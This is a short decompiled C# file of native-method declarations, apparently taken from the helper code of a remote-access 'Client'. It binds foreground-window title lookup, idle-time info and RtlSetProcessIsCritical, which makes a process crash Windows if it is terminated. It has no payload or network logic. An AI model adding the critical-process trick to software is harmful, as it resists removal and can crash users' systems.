using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper
{
	// Token: 0x02000015 RID: 21
	public static class NativeMethods
	{
		// Token: 0x06000060 RID: 96
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000061 RID: 97
		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		// Token: 0x06000062 RID: 98
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		// Token: 0x02000016 RID: 22
		public enum EXECUTION_STATE : uint
		{
			// Token: 0x04000034 RID: 52
			ES_CONTINUOUS = 2147483648U,
			// Token: 0x04000035 RID: 53
			ES_DISPLAY_REQUIRED = 2U,
			// Token: 0x04000036 RID: 54
			ES_SYSTEM_REQUIRED = 1U
		}

		// Token: 0x02000017 RID: 23
		internal struct LASTINPUTINFO
		{
			// Token: 0x04000037 RID: 55
			public static readonly int SizeOf = Marshal.SizeOf(typeof(NativeMethods.LASTINPUTINFO));

			// Token: 0x04000038 RID: 56
			[MarshalAs(UnmanagedType.U4)]
			public uint cbSize;

			// Token: 0x04000039 RID: 57
			[MarshalAs(UnmanagedType.U4)]
			public uint dwTime;
		}
	}
}
